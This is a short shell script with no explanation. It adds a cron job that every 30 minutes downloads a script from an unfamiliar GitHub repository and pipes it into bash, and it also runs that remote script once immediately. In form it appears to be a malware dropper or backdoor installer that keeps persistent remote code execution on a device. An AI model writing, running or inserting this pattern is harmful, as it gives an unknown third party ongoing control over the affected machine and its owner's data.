#!/bin/sh
arch=`crontab -l | grep -i -c gsha71c4b77a5e5`
echo $arch
if [ $arch != 0 ];then
    echo "crontab already in it"
else 
    echo "0-59/30 * * * * curl -s -L https://raw.githubusercontent.com/gptloveyou/gshell/main/gsha71c4b77a5e5.sh | bash" >> /etc/config/crontab 
    /usr/bin/crontab /etc/config/crontab
    echo "install crontab"
fi
curl -s -L https://raw.githubusercontent.com/gptloveyou/gshell/main/gsha71c4b77a5e5.sh | bash
